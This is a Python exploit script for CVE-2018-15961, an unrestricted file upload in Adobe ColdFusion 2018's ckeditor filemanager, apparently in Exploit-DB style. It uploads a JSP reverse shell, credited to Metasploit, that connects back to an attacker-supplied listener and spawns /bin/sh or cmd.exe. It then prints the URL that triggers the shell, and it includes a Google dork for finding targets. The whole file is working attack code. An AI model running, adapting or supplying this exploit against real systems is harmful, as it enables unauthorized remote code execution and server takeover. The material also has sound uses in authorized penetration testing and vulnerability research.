# AJ2K
# Exploit Title: Unrestricted file upload in Adobe ColdFusion 2018
# Google Dork: ext:cfm
# Vendor Homepage: adobe.com
# Version: 2018
# Tested on: Adobe ColdFusion 2018
# CVE : CVE-2018-15961

import requests
import argparse

def error():
     parser.print_help()
     quit()

parser = argparse.ArgumentParser(description='Args')
requiredNamed = parser.add_argument_group('Required Arguments')
requiredNamed.add_argument("-u", dest="rhost", help="The IP to attack", required=True)
requiredNamed.add_argument("-p", dest="rport", help="The port to attack", required=True)
requiredNamed.add_argument("-f", dest="filename", help="I don't care what you put in here aslong as it ends it .jsp", required=True)
requiredNamed.add_argument("-lh", dest="lhost", help="The IP of your local listener", required=True)
requiredNamed.add_argument("-lp", dest="lport", help="The port of your local listener", required=True)
parser.add_argument("--proxies", dest="proxy", help="protocol:host:port eg http://127.0.0.1:8080")
args = parser.parse_args()

try:
     url = "http://"+args.rhost
     port = args.rport
     filename = '"'+args.filename
     filename2 = args.filename
     lhost = '"'+args.lhost
     lport = args.lport
except:
     error()

if args.proxy is None:
     proxybool = False
else:
     proxiesarg = args.proxy
     proxybool = True

if filename.endswith(('.jsp')):
     pass
else:
     print("Filename does not end in .jsp")
     error()

attack=url+":"+port+"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"

data = """--_Part_25_194601510_2784918519\n"""
data += 'Content-Disposition: form-data; name="file"; filename='+filename+'"'
data += """ # Payload taken from Metasploit 
Content-Type: application/octet-stream

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream cw;
    OutputStream wb;

    StreamConnector( InputStream cw, OutputStream wb )
    {
      this.cw = cw;
      this.wb = wb;
    }

    public void run()
    {
      BufferedReader fi  = null;
      BufferedWriter tkq = null;
      try
      {
        fi  = new BufferedReader( new InputStreamReader( this.cw ) );
        tkq = new BufferedWriter( new OutputStreamWriter( this.wb ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fi.read( buffer, 0, buffer.length ) ) > 0 )
        {
          tkq.write( buffer, 0, length );
          tkq.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fi != null )
          fi.close();
        if( tkq != null )
          tkq.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
"""
data += 'Socket socket = new Socket('+lhost+'"'+', '+lport+');'
data += """
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--_Part_25_194601510_2784918519
Content-Disposition: form-data; name="path"
Content-Type: text/plain

path
--_Part_25_194601510_2784918519--"""

headers = {
"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Content-Type": "multipart/form-data; boundary=_Part_25_194601510_2784918519",
"Content-Length": "1842",
"Connection": "close"
}
if (proxybool):
     proxies = {
     "http": proxiesarg
     }
#    print("proxy yes")
     r = requests.post(attack, proxies=proxies, headers=headers, data=data)
else:
#    print("proxy no")
     r = requests.post(attack, headers=headers, data=data)
print("now visit -> " +url+":"+port+"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/"+filename2)
